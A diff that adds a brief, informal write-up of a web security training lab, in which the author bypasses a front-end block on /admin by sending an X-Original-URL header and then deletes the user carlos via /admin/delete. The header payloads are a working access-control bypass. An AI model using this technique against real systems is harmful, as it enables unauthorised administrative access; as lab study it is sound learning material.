@@ -1,0 +1,20 @@
+Lab: URL-based access control can be circumvented
+
+ This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.
+
+To solve the lab, access the admin panel and delete the user carlos. 
+
+
+X-Original-URL: /admin
+
+we see tha panel but we dont have permision to deleter carlos then
+
+https://0a78009103118f418158084f0043007a.web-security-academy.net/admin/delete?username=wiener
+
+we want to go GET /admin/delete?username=carlos HTTP/2
+
+lets do it
+
+X-Original-URL: /admin/delete
+
+?username=carlos in the real URL
